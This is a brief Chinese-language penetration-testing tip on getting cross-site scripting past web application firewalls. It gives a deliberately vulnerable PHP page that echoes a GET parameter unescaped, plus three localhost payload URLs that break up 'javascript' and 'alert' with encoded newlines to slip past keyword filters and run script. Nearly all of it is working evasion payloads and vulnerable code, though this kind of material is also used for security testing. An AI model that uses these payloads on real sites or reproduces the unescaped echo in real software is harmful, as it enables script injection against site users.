### 当xss被waf拦截的时候可以试试 ###

测试代码：
```php
<?php
function demo($zhi){
	echo $zhi;
}

if (isset($_GET['g'])){
	$g=$_GET['g'];
	demo($g);
}
?>
```

payload
```js
http://127.0.0.1/demoq.php?g=%3Ciframe/src=%27j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`%27%3E

http://127.0.0.1/demoq.php?g=%3Ca/href=%22j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:alert(1)%22%3Es%3C/a%3E

http://127.0.0.1/demoq.php?g=%3Ca/href=%22j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:a%0al%0aert(1)%22%3Es%3C/a%3E
```

总之用%0A（换行符）将关键字比如说：javascript alert ..等等分割

![](https://s2.ax1x.com/2019/04/21/Eiynne.png)

![](https://s2.ax1x.com/2019/04/21/EiyG1f.md.png)


